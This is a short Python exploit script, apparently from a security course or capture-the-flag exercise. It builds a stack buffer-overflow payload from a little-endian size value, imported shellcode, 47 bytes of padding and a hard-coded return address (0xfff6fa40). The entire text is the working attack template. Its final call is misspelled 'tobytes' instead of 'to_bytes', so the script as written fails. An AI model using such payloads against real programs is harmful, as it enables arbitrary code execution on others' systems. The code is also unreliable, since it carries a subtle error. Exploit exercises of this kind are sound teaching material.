from shellcode import shellcode
import sys
sys.stdout.buffer.write(0x4000000E.to_bytes(4, "little")+shellcode+b"a"*47+0xfff6fa40.tobytes(4, "little"))